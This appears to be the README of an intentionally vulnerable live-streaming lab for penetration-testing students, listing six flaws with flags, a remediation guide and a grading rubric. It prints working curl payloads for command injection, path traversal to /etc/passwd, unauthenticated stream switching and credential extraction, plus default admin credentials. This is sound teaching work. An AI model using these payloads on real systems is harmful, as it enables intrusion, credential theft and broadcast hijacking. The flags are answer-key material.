# üî¥ Live Broadcasting Penetration Testing Lab

## üéØ Lab Overview

This is an **intentionally vulnerable** live streaming platform designed for penetration testing education. Students will learn to identify and exploit common vulnerabilities in live broadcasting systems.

**‚ö†Ô∏è WARNING: This system contains INTENTIONAL security vulnerabilities for educational purposes. DO NOT deploy in production!**

---

## üéì Learning Objectives

Students will learn to:
- Identify API vulnerabilities in streaming platforms
- Exploit authentication bypasses
- Perform path traversal attacks
- Execute command injection
- Discover information disclosure vulnerabilities
- Exploit IDOR (Insecure Direct Object References)
- Hijack live video streams

---

## üèÜ Challenge: Hijack the Live Stream!

**Goal:** Replace the current live video with your own video file by exploiting vulnerabilities in the system.

**Difficulty Levels:**
1. üü¢ **Beginner**: Use the exposed API (no authentication required)
2. üü° **Intermediate**: Upload your video and switch the stream
3. üî¥ **Advanced**: Find and exploit multiple vulnerabilities to gain full control

---

## üîì Known Vulnerabilities

### Vulnerability #1: Missing Authentication on Critical API
**Severity:** üî¥ CRITICAL  
**Endpoint:** `/api/switch-video`  
**CWE:** CWE-306 (Missing Authentication)

**Description:**  
The video switching API has NO authentication requirement. Anyone can change the live broadcast!

**Exploitation:**
```bash
# Step 1: Check if endpoint exists
curl -X POST http://manage.ann-news.live/api/switch-video

# Step 2: Switch to a different video
curl -X POST http://manage.ann-news.live/api/switch-video \
     -H "Content-Type: application/json" \
     -d '{"video": "your-video.mp4"}'
```

**Flag:** `PENTESTER{uns3cur3_4p1_n0_4uth}`

---

### Vulnerability #2: Path Traversal
**Severity:** üü† HIGH  
**Endpoint:** `/api/video-info`  
**CWE:** CWE-22 (Path Traversal)

**Description:**  
The video info endpoint doesn't validate file paths, allowing access to files outside the intended directory.

**Exploitation:**
```bash
# Read arbitrary files on the system
curl "http://manage.ann-news.live/api/video-info?path=../../etc/passwd"
curl "http://manage.ann-news.live/api/video-info?path=../../etc/hosts"
curl "http://manage.ann-news.live/api/video-info?path=../../../tmp/current_video.txt"
```

**Flag:** `PENTESTER{p4th_tr4v3rs4l_vuln}`

---

### Vulnerability #3: Command Injection
**Severity:** üî¥ CRITICAL  
**Endpoint:** `/api/stream-control`  
**CWE:** CWE-78 (OS Command Injection)

**Description:**  
The stream control endpoint executes shell commands without sanitization.

**Exploitation:**
```bash
# Basic command injection
curl -X POST http://manage.ann-news.live/api/stream-control \
     -H "Content-Type: application/json" \
     -d '{"action": "restart; whoami"}'

# List video directory
curl -X POST http://manage.ann-news.live/api/stream-control \
     -H "Content-Type: application/json" \
     -d '{"action": "restart; ls -la /opt/videos"}'

# Read sensitive files
curl -X POST http://manage.ann-news.live/api/stream-control \
     -H "Content-Type: application/json" \
     -d '{"action": "restart; cat /etc/passwd"}'
```

**Flag:** `PENTESTER{c0mm4nd_1nj3ct10n}`

---

### Vulnerability #4: IDOR (Insecure Direct Object Reference)
**Severity:** üü† HIGH  
**Endpoint:** `/api/admin/user/<id>`  
**CWE:** CWE-639 (IDOR)

**Description:**  
User data can be accessed without authorization by manipulating user IDs.

**Exploitation:**
```bash
# Access different user accounts
curl "http://manage.ann-news.live/api/admin/user/1"
curl "http://manage.ann-news.live/api/admin/user/2"
curl "http://manage.ann-news.live/api/admin/user/3"

# Extract API keys
curl "http://manage.ann-news.live/api/admin/user/1" | grep api_key
```

**Flag:** `PENTESTER{1d0r_4cc3ss_c0ntr0l}`

---

### Vulnerability #5: Information Disclosure
**Severity:** üü† HIGH  
**Endpoint:** `/api/debug/config`  
**CWE:** CWE-200 (Information Exposure)

**Description:**  
Debug endpoint exposes sensitive configuration data including credentials and API keys.

**Exploitation:**
```bash
# Get all sensitive configuration
curl "http://manage.ann-news.live/api/debug/config"

# Extract specific information
curl "http://manage.ann-news.live/api/debug/config" | grep password
curl "http://manage.ann-news.live/api/debug/config" | grep secret_key
```

**Flag:** `PENTESTER{d3bug_1nf0_l34k}`

---

### Vulnerability #6: Weak Session Management
**Severity:** üü° MEDIUM  
**Endpoint:** `/api/create-session`  
**CWE:** CWE-331 (Insufficient Entropy)

**Description:**  
Session tokens are predictable and easy to guess.

**Exploitation:**
```bash
# Generate predictable session token
curl -X POST http://manage.ann-news.live/api/create-session \
     -H "Content-Type: application/json" \
     -d '{"username": "admin"}'

# Token format: session_{username}_123
# Can be easily predicted and reused
```

**Flag:** `PENTESTER{w34k_s3ss10n_t0k3n}`

---

## üé¨ Complete Attack Scenario: Stream Hijacking

### Scenario 1: Quick Hijack (Beginner)
```bash
# 1. Discover the vulnerable endpoint
curl http://manage.ann-news.live/api/vulns/list

# 2. Upload your video (requires authentication)
# First login at https://manage.ann-news.live
# Username: admin, Password: admin123
# Upload your video file through the web interface

# 3. Switch the stream (NO AUTH NEEDED!)
curl -X POST http://manage.ann-news.live/api/switch-video \
     -H "Content-Type: application/json" \
     -d '{"video": "your-hacked-video.mp4"}'

# 4. Watch your video on the live stream!
# Go to: https://ann-news.live
```

### Scenario 2: Full Reconnaissance (Intermediate)
```bash
# 1. Enumerate the system
curl http://manage.ann-news.live/api/debug/config

# 2. Get admin credentials from debug endpoint
curl http://manage.ann-news.live/api/debug/config | grep admin_credentials

# 3. Access user data
curl http://manage.ann-news.live/api/admin/user/1

# 4. List available videos
curl http://manage.ann-news.live/api/stream-control \
     -H "Content-Type: application/json" \
     -d '{"action": "restart; ls /opt/videos"}'

# 5. Switch to any video
curl -X POST http://manage.ann-news.live/api/switch-video \
     -H "Content-Type: application/json" \
     -d '{"video": "videoplayback.mp4"}'
```

### Scenario 3: Advanced Exploitation (Advanced)
```bash
# 1. Path traversal to find video directory structure
curl "http://manage.ann-news.live/api/video-info?path=."

# 2. Command injection to explore system
curl -X POST http://manage.ann-news.live/api/stream-control \
     -H "Content-Type: application/json" \
     -d '{"action": "restart; find /opt -name *.mp4"}'

# 3. Create your own video entry
curl -X POST http://manage.ann-news.live/api/stream-control \
     -H "Content-Type: application/json" \
     -d '{"action": "restart; echo hacked > /tmp/pwned.txt"}'

# 4. Chain multiple vulnerabilities
# Use IDOR to get API keys ‚Üí Use keys for authenticated upload ‚Üí Switch stream
```

---

## üõ†Ô∏è Lab Setup for Students

### Prerequisites
- Kali Linux or any pentesting distribution
- curl, wget, or Burp Suite
- Basic knowledge of HTTP/REST APIs
- Understanding of Python/Flask (optional)

### Getting Started
1. Access the live stream: `https://ann-news.live`
2. Access management interface: `https://manage.ann-news.live`
3. Default credentials: `admin / admin123`
4. Start with reconnaissance: `curl http://manage.ann-news.live/api/vulns/list`

---

## üìù Student Exercises

### Exercise 1: API Discovery
- [ ] Find all exposed API endpoints
- [ ] Identify which endpoints require authentication
- [ ] Document the API structure

### Exercise 2: Authentication Bypass
- [ ] Identify endpoints without proper authentication
- [ ] Exploit the missing authentication to change video
- [ ] Capture the flag

### Exercise 3: Information Gathering
- [ ] Use information disclosure to find credentials
- [ ] Extract API keys from exposed debug endpoint
- [ ] Use path traversal to read system files

### Exercise 4: Stream Hijacking
- [ ] Upload your own video file
- [ ] Switch the live stream to your video
- [ ] Verify your video is playing on the live stream

### Exercise 5: Command Injection
- [ ] Identify command injection vulnerability
- [ ] Execute system commands
- [ ] Read sensitive files using command injection

### Exercise 6: Full System Compromise
- [ ] Chain multiple vulnerabilities
- [ ] Gain complete control of the streaming system
- [ ] Document your attack path

---

## üèÖ Capture All Flags

Collect all flags to complete the lab:

1. ‚¨ú `PENTESTER{uns3cur3_4p1_n0_4uth}`
2. ‚¨ú `PENTESTER{p4th_tr4v3rs4l_vuln}`
3. ‚¨ú `PENTESTER{c0mm4nd_1nj3ct10n}`
4. ‚¨ú `PENTESTER{1d0r_4cc3ss_c0ntr0l}`
5. ‚¨ú `PENTESTER{d3bug_1nf0_l34k}`
6. ‚¨ú `PENTESTER{w34k_s3ss10n_t0k3n}`
7. ‚¨ú `INSTRUCTOR{c0mpl3t3d_4ll_vulns}` (Bonus)

---

## üîí Remediation Guide (For Instructors)

### How to Fix These Vulnerabilities

1. **Missing Authentication**
   - Add authentication decorators to all sensitive endpoints
   - Implement proper role-based access control (RBAC)
   - Use JWT or OAuth2 for API authentication

2. **Path Traversal**
   - Validate and sanitize all file paths
   - Use `os.path.abspath()` and check if path is within allowed directory
   - Never trust user input for file operations

3. **Command Injection**
   - Never use `shell=True` with user input
   - Use parameterized commands
   - Validate and whitelist allowed commands

4. **IDOR**
   - Implement proper authorization checks
   - Verify user has permission to access resource
   - Use indirect object references (random IDs)

5. **Information Disclosure**
   - Remove debug endpoints in production
   - Never expose credentials in API responses
   - Use environment variables for secrets

6. **Weak Session Management**
   - Use cryptographically secure random tokens
   - Implement token expiration
   - Use established session libraries

---

## üìö Additional Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP API Security: https://owasp.org/www-project-api-security/
- CWE Database: https://cwe.mitre.org/
- Pentesting Cheatsheets: https://github.com/swisskyrepo/PayloadsAllTheThings

---

## ‚öñÔ∏è Legal Disclaimer

This lab is for **EDUCATIONAL PURPOSES ONLY**. 

- Only use these techniques in authorized environments
- Never attack systems without explicit permission
- Unauthorized access to computer systems is illegal
- Students must follow ethical hacking guidelines

---

## üë®‚Äçüè´ For Instructors

### Lab Assessment Rubric

| Criteria | Points |
|----------|--------|
| Discovered all vulnerabilities | 20 |
| Successfully exploited 3+ vulnerabilities | 30 |
| Captured all flags | 25 |
| Documented attack methodology | 15 |
| Proposed remediation solutions | 10 |
| **Total** | **100** |

### Suggested Timeline
- Day 1: Introduction to API security and reconnaissance
- Day 2: Hands-on exploitation exercises
- Day 3: Advanced attacks and chaining vulnerabilities
- Day 4: Remediation and secure coding practices

---

## üéì Certification

Upon completion, students should be able to:
- ‚úÖ Identify common API vulnerabilities
- ‚úÖ Perform security assessments on web applications
- ‚úÖ Exploit authentication and authorization flaws
- ‚úÖ Understand secure coding practices
- ‚úÖ Write professional penetration testing reports

---

**Happy Hacking! üéØ**

